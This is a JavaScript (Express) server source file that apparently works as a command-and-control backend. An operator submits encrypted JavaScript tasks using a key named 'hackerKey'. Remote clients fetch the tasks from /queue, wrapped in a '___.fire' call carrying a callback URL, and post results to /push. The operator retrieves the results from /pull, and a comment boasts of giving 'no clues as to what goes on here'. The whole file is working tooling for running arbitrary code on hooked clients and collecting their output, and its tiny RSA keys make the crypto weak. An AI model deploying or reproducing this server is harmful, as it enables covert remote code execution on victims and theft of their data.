
/**
 * Module dependencies.
 */

var express = require('express')
  , http = require('http')
  , path = require('path');

require("./lib/Barrett");
require("./lib/BigInt");
require("./lib/RSA");

var app = express();

// all environments
app.set('port', process.env.PORT || 3000);
app.use(express.favicon());
app.use(express.logger('dev'));
app.use(express.bodyParser());
app.use(express.methodOverride());
app.use(app.router);

// development only
if ('development' == app.get('env')) {
  app.use(express.errorHandler());
}

setMaxDigits(19);
// key 1: "5dd5ad3ab3e3eb5409c0ead832b7a21d"
// key 2: "bf79e379f1535ddf1de7571f65b04b5"
var hackerKey = new RSAKeyPair(
 "5dd5ad3ab3e3eb5409c0ead832b7a21d",
 "5dd5ad3ab3e3eb5409c0ead832b7a21d",
 "907e4e9bdca8832febfa32d958dee42d"
);
var serverKey = new RSAKeyPair(
 "bf79e379f1535ddf1de7571f65b04b5",
 "bf79e379f1535ddf1de7571f65b04b5",
 "907e4e9bdca8832febfa32d958dee42d"
);

console.log(encryptedString(hackerKey, 'function(callback){callback("yeah!")}'));

// Storage
var queue = [];
var results = {};
var pullKey = null;

// Funcs
function getKey() {
    return [0,0,0,0].map(function(){ return Math.random().toString(16).substring(2) }).join('');
}

app.get('/', function(req, res){
    res.send('Yo dawg.');
});

app.get('/queue', function(req, res){

    if (queue.length) {
        res.send(queue.pop());

    } else {
        res.send(204);
    }
});

app.post('/queue', function(req, res){

    try {
        var key = getKey();
        var task = decryptedString(serverKey, req.body.data);

        console.log('adding:', key, ':', task);
        queue.unshift('___.fire({return:"http://' + req.headers.host + '/results",key:"' + key + '",task:' + task + '});');

        results[key] = null;

        res.send(204);

    } catch (e) {
        res.send(400); // Give no clues as to what goes on here
    }
});

app.get('/push', function(req, res){

    console.log(results);
    console.log(req.query.key);

    if (results[req.query.key] !== undefined) {
        results[req.query.key] = req.query.result
        res.send(204);

    } else {
        res.send(403);
    }
});

app.get('/pullkey', function(req, res){
    pullKey = encryptedString(serverKey, getKey());
    res.send({ key: pullKey });
});

app.get('/pull', function(req, res){

    if (decryptedString(serverKey, req.query.key) == pullKey) {

        res.send( encryptedString(serverKey, JSON.stringify(results)) );

        for (var key in results) {
            if (results[key]) {
                delete results[key];
            }
        }

    } else {
        res.send(403);
    }
});

http.createServer(app).listen(app.get('port'), function(){
  console.log('Express server listening on port ' + app.get('port'));
});
